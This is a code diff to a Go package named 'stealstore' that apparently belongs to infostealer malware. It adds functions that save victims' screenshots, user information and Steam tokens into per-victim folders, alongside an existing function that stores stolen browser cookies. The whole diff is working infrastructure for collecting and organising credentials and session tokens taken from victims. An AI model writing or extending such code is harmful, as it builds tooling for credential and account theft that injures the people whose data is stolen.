@@ -1,6 +1,7 @@
 package stealstore
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -44,6 +45,38 @@ func SaveResult(victimID string, browserName string, cookies string) error {
 	bName = strings.ReplaceAll(bName, "..", "_")
 	fname := bName + "Cookies.txt"
 	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
+}
+
+func SaveScreenshot(victimID string, b64data string) error {
+	dir := filepath.Join(DataDir(victimID), "Monitor")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	data, err := base64Decode(b64data)
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(filepath.Join(dir, "screenshot.jpg"), data, 0o644)
+}
+
+func SaveUserInfo(victimID string, info string) error {
+	dir := DataDir(victimID)
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	return os.WriteFile(filepath.Join(dir, "UserInformation.txt"), []byte(info), 0o644)
+}
+
+func SaveSteamTokens(victimID string, tokens string) error {
+	dir := filepath.Join(DataDir(victimID), "Clients")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	return os.WriteFile(filepath.Join(dir, "SteamTokens.txt"), []byte(tokens), 0o644)
+}
+
+func base64Decode(s string) ([]byte, error) {
+	return base64.StdEncoding.DecodeString(s)
 }
 
 func UpdateMeta(victimID, autoSteal string) error {
